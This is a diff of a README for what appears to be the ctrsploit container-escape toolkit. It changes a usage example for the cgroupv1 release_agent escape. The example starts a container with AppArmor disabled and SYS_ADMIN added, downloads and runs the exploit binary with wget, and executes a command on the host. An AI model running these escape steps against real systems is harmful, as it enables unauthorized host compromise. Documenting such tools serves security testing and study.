@@ -46,7 +46,7 @@ OPTIONS:
 
 例如: 使用'cgroupv1-release_agent'技术逃逸:
 ```
-root@host # docker run -ti --rm --security-opt="seccomp=unconfined" --cap-add="sys_admin" busybox
+root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
 root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
 root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ```
